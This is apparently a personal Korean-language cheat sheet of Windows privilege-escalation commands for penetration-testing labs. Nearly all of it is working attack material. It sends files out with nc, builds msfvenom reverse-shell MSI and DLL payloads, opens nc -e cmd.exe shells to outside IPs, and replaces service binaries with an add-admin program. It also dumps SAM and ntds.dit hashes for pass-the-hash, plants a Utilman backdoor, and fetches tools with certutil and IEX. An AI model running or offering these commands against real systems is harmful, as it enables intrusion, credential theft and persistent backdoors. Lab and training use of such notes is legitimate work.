<details>
 <summary><strong>Sherlock</strong></summary>

- https://github.com/rasta-mouse/Sherlock
- 예전 버전 윈도우 취약점 발견.

</details>

---

## use nc to transfer files
```powershell
nc 10.10.10.10 80 < file.txt
```

## findstr
```powershelll
type <file> | findstr /I /N 'NTLM'
```
---
## Winlogon 설정값 조회
```powershell
reg.exe query "HKLM\software\microsoft\windows nt\currentversion\winlogon"
```

---

## PowerShell History
```powershell
$historyPath = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
$historyPath

# 파일이 존재하는지 확인
Test-Path $historyPath

# 히스토리 내용 보기
Get-Content $historyPath
```

---

## icacls
```powershell
icacls root.txt /grant alfred:F
```
- root.txt에 alfred에게 Full 권한을 줌

---

## 파일 검색
```powershell
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml

gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password
```

---

## 시스템 정보 수집
```powershell
Get-LocalUser
Get-LocalGroup
Get-LocalGroupMember adminteam
```

```powershell
systeminfo
ipconfig /all
route print
netstat -ano
services
```

```powershell
# 32비트 프로그램 설치 목록 (64비트 Windows)
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

# 64비트 프로그램 설치 목록
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

Get-Process
```

```powershell
Get-ChildItem -Path C:\ `
 -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*kdbx,*ini `
 -File -Recurse -ErrorAction SilentlyContinue
```

```powershell
# 다른 사용자로 명령 프롬프트 실행
runas /user:backupadmin cmd
```

```powershell
# 실행 중인 서비스 목록 조회
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}

# 파일 접근 권한 확인
icacls "C:\xampp\apache\bin\httpd.exe"
```

---

## Service Binary Hijacking
```powershell
Get-Service > service.txt

# 실행 중인 서비스만
Get-Service | Where-Object {$_.Status -eq "Running"} > service.txt

# cmd
sc query > service.txt

# 서비스 시작/중지
Start-Service GammaService
Stop-Service GammaService

sc.exe start GammaService
sc.exe stop GammaService
```

### C 코드로 악성 실행 파일 생성
```c
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  
  return 0;
}
```

```bash
# 크로스 컴파일
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```

### 서비스 바이너리 교체
```powershell
iwr -uri http://192.168.48.3/adduser.exe -Outfile adduser.exe

move C:\xampp\mysql\bin\mysqld.exe mysqld.exe
move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe

net stop mysql
whoami /priv
shutdown /r /t 0
```

### PowerUp.ps1 사용
```powershell
iwr -uri http://192.168.48.3/PowerUp.ps1 -Outfile PowerUp.ps1

powershell -ep bypass

. .\PowerUp.ps1

Get-ModifiableServiceFile
# 서비스 실행 파일에 일반 사용자 쓰기 권한이 있는 경우를 찾아냄
# 악성 파일로 서비스 실행 파일을 교체하여 권한 상승 가능
```

---

## Unquoted Service Paths

### 수동 확인
```powershell
# 인용부호가 없는 서비스 경로 찾기
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """

# 서비스 상세 정보 확인
sc qc VeyonService

# 서비스 시작/중지
Start-Service GammaService
Stop-Service GammaService

sc.exe start GammaService
sc.exe stop GammaService

# 디렉토리 권한 확인
icacls "C:\Program Files\Enterprise Apps"
```

### PowerUp.ps1 사용
```powershell
Get-UnquotedService

Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe"

Restart-Service GammaService
```

---

## Scheduled Tasks
```powershell
schtasks /query /fo LIST /v
```

---

## Token Impersonation (SeImpersonatePrivilege)

### PrintSpoofer
```powershell
.\print.exe -i -c cmd.exe

.\print.exe -c shell.exe
```

### JuicyPotato
```bash
# msfvenom으로 리버스 셸 생성
msfvenom -p windows/x64/shell_reverse_tcp -f exe
```

```powershell
.\JuicyPotato.exe -t * -p shell.exe -l 443 -c <CLSID>
```
- https://github.com/ohpe/juicy-potato (CLSID 참고)

### GodPotato
```powershell
.\GodPotato.exe -cmd "C:\Users\nathan\Nexus\nexus-3.21.0-05\nc.exe -e cmd.exe 192.168.45.162 4040"
```

- https://usersince99.medium.com/windows-privilege-escalation-token-impersonation-seimpersonateprivilege-364b61017070

---

## Windows Add User Command
```powershell
# 사용자 생성
net user api Dork123! /add

# 관리자 및 RDP 그룹에 추가
net localgroup Administrators api /add
net localgroup 'Remote Desktop Users' api /add
```

---

## AlwaysInstallElevated

### 레지스트리 확인
```powershell
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
reg query HKLM\Software\Policies\Microsoft\Windows\Installer
```
<img width="1534" height="706" alt="image" src="https://github.com/user-attachments/assets/a70d541f-eb2a-4067-8af6-9a97ecc0d0c8" />

### MSI 패키지 생성 및 실행
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.31.141 lport=443 -a x64 --platform windows -f msi -o ignite.msi
```

```powershell
powershell wget 192.168.31.141/ignite.msi -o ignite.msi
msiexec /quiet /qn /i ignite.msi
```

- https://www.hackingarticles.in/windows-privilege-escalation-alwaysinstallelevated/

---

## SeBackupPrivilege
### base file location
```powershell
C:\windows\system32\SAM
C:\windows\system32\SYSTEM
```

### SAM 및 SYSTEM 레지스트리 덤프
```powershell
cd c:\
mkdir Temp
reg save hklm\sam c:\Temp\sam
reg save hklm\system c:\Temp\system
```

### 해시 추출 및 Pass-the-Hash
```bash
pypykatz registry --sam sam system
impacket-secretsdump -sam sam -system system

evil-winrm -i <ip> -u <user> -H <hash>
```

### ntds.dit 추출
```bash
# cat backup
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
set context persistent
begin backup
add volume C: alias cdrive
create
expose %cdrive% E:
end backup

unix2dos backup 
```

```powershell
diskshadow /s backup
ls E:
robocopy /b E:\Windows\ntds . ntds.dit
```

```bash
secretsdump.py -ntds ntds.dit -system system LOCAL
```

- https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege

---

## PowerUp.ps1 전체 체크
```powershell
. .\PowerUp.ps1
Invoke-AllChecks
```

---

## SeRestore
```powershell
# C:\Windows\system32
ren Utilman.exe Utilman.old
ren cmd.exe Utilman.exe
```

```bash
rdesktop 192.168.81.165
# Windows + U 키를 눌러 Utilman 실행 (실제로는 cmd 실행)
```

---

## SeManageVolume

### 방법 1: tzres.dll 교체
```bash
wget https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1
wget https://github.com/CsEnox/SeManageVolumeExploit/releases/download/public/SeManageVolumeExploit.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=[IP-ADDRESS] LPORT=1337 -f dll -o tzres.dll
```

```powershell
. .\EnableAllTokenPrivs.ps1

.\SeManageVolumeExploit.exe

icacls c:\windows

copy tzres.dll C:\Windows\System32\wbem\

systeminfo
```

### 방법 2: WerTrigger 이용
```bash
wget https://github.com/sailay1996/WerTrigger/raw/master/bin/WerTrigger.exe
wget https://github.com/sailay1996/WerTrigger/raw/master/bin/phoneinfo.dll
wget https://raw.githubusercontent.com/sailay1996/WerTrigger/master/bin/Report.wer
```

```powershell
. .\EnableAllTokenPrivs.ps1

.\SeManageVolumeExploit.exe

icacls c:\windows

certutil -urlcache -f http://[IP-ADDRESS]:80/WerTrigger.exe WerTrigger.exe
certutil -urlcache -f http://[IP-ADDRESS]:80/phoneinfo.dll phoneinfo.dll
certutil -urlcache -f http://[IP-ADDRESS]:80/nc.exe nc.exe
certutil -urlcache -f http://[IP-ADDRESS]:80/Report.wer Report.wer

copy phoneinfo.dll c:\windows\system32\

dir c:\windows\system32\phoneinfo.dll

.\wertrigger.exe
c:\temp\nc.exe <ip> <port> -e cmd.exe
```

- https://hackfa.st/Offensive-Security/Windows-Environment/Privilege-Escalation/Token-Impersonation/SeManageVolumePrivilege/

---

## Server Operators Group
```powershell
services

upload nc.exe

sc.exe config VMTools binPath="C:\temp\shell.exe"

# lhost에서 리스너 실행
nc -vnlp 1234

sc.exe stop VMTools
sc.exe start VMTools
```

- https://www.hackingarticles.in/windows-privilege-escalation-server-operator-group/

---

## 참고 자료
- Privilege Escalation 기법 모음: https://github.com/gtworek/Priv2Admin

---

## XAMPP 관련
- `C:\xampp\properties.ini` : xampp 설정파일

---

## Windows 재시작
```powershell
shutdown /r /t 0
```

---

## Windows Download Commands
```powershell
certutil -urlcache -f -split <target>

Invoke-WebRequest <target> -OutFile <Path>

curl http://example.com/nc.exe -o nc.exe

# linux의 wget과 다르다 !
wget http://example.com/file.exe -OutFile file.exe
```

---

## Windows SSH 파일 위치
```powershell
C:\Users\<Username>\.ssh
```

---

## Path Variables 설정
```powershell
set PATH=%PATH%C:\Windows\System32;C:\Windows\System32\WindowsPowerShell\v1.0;
```

---

## PowerShell 명령어 모음
```powershell
IEX(New-Object Net.WebClient).DownloadString("http://ip/file")

Rename-Item -Path <String> -NewName <String>

Remove-Item -Path "C:\Path\To\YourFile.txt"
```
